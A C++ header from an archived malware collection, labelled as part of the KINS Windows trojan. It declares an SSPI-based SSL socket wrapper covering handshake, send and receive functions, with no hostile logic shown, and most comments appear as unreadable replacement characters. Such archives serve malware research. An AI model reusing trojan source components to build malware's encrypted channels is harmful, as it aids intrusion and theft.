/*
  name      KINS
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  SSL-����� �� SSPI.

  ����������:
    1. �� ��������� ���� ����������� ������ ������, �.�. � �������� ������ ���.
    2. ��� ������ ����� �������������� ������ ����������� ������.
*/
#pragma once

#include <security.h>
#include <schnlsp.h>

namespace SslSocket
{
  enum
  {
    SDF_STATUS_HANDSHAKE = 0x1
  };
  
  typedef struct
  {
    DWORD flags;
    CredHandle credHandle;
    CtxtHandle ctxtHandle;
  }SERVERDATA;
  
  
  typedef struct
  {
    SOCKET socket;
    SecHandle sh;
    CtxtHandle ch;
    SecPkgContext_StreamSizes streamSizes;
    void *extraBuffer;
    DWORD extraBufferSize;
    void *ioBuffer;
    DWORD ioBufferSize;
    void *pendingData;
    DWORD pendingDataSize;
  }SOCKETDATA;
  
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  SERVERDATA *_createServerData(PCCERT_CONTEXT context, DWORD enabledProtocols);
  void _freeServerData(SERVERDATA *sd);
  
  bool _serverHandshake(SERVERDATA *sd, void *recv, DWORD recvSize, void *send, DWORD *sendSize);  
  /*
    ����������� SSL handshake �� ������� �������.

    IN socket           - �����.
    IN serverName       - ��� ������� (��� ������ � ������������).
    OUT sd              - ������ SSL-������.
    IN enabledProtocols - ������ �������� ���������� SP_PROT_*_CLIENT.
    IN timeout          - ���������� ����������� �������� ��������� ������, ��� 0 ��� ������������
                          ��������. 

    Return              - true - � ������ ��������� ������������ ����������,
                          false - � ������ ������.
  */
  bool _startClientEncryption(SOCKET socket, LPWSTR serverName, SOCKETDATA *sd, DWORD enabledProtocols, DWORD timeout);
  
  /*
    ��������� SSL-����� (�� ��������� ����������).

    IN sd - ������ SSL-������.
  */
  void _close(SOCKETDATA *sd);
  
  /*
    ������ ������ � �����.

    IN sd      - ������ SSL-������.
    IN buf     - ����� � �������.
    IN bufSize - ������ ������.

    Return      - true - � ������ ������,
                  false - � ������ ������.
  */
  bool _send(SOCKETDATA *sd, void *buf, int bufSize);
  
  /*
    ������ ������ �� ������.

    IN sd             - ������ SSL-������.
    OUT buf           - ����� ��� ������.
    IN bufSize        - ������ ������.
    IN timeout        - ���������� ����������� �������� ��������� ������, ��� 0 ��� ������������
                        ��������.
    OUT extraAvalible - �������� ������� �� ��������������, ������� �� ���������� � �����.
    
    Return            - ���������� ���������� ���� ��� SOCKET_ERROR.
  */
  int _recv(SOCKETDATA *sd, void *buf, int bufSize, DWORD timeout, bool *extraAvalible);

  /*
    ������ ������ �� ������ �� ������� ���������� ������.

    IN sd             - ������ SSL-������.
    OUT buf           - ����� ��� ������.
    IN bufSize        - ������ ������.
    IN timeout        - ���������� ����������� �������� ��������� ������, ��� 0 ��� ������������
                        ��������.
    OUT extraAvalible - �������� ������� �� ��������������, ������� �� ���������� � �����.

    Return            - true - � ������ ������,
                        false - � ������ ������.
  */
  bool _recvAll(SOCKETDATA *sd, void *buf, int bufSize, DWORD timeout, bool *extraAvalible);
};
